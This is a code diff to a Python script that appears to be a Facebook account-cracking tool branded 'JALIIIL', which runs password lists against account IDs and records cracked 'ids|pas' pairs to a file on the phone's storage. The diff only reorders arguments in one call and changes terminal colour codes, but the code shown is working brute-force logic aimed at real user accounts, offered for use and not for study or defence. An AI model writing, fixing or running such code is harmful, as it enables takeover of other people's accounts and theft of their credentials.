@@ -287,7 +287,7 @@ def menu():
 						elif mthd in ['2','02']:
 							crack_submit.submit(api,ids,names,passlist)
 						elif mthd in ['3','03']:
-						 crack_submit.submit(sajid4,names,ids,passlist)
+						 crack_submit.submit(sajid4,ids,names,passlist)
 				print('\033[1;37m')
 				linex()
 				print(' The process has completed')
@@ -535,7 +535,7 @@ def api(ids,names,passlist):
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
+						print('\r\r\033\[1;33m[JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
 						open('/sdcard/JALIIIL/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
@@ -617,7 +617,7 @@ def ffb(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\033\[1;33m [JALIIIL-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/JALIIIL/JALIIIL-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
